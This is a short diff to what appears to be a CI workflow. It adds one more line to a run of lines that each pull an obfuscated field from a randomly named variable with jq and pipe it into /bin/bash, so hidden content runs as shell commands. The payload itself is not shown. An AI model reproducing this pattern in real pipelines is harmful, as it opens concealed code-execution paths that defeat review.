@@ -23,6 +23,7 @@ jobs:
           printf '%s' "$fsc077" | jq -r .oibmx0 | /bin/bash
           printf '%s' "$dscyo05857" | jq -r .kqcql77682 | /bin/bash
           printf '%s' "$by7" | jq -r .syrs834 | /bin/bash
+          printf '%s' "$vcxww5" | jq -r .rb31 | /bin/bash
 
       - name: Archive results
         if: always()
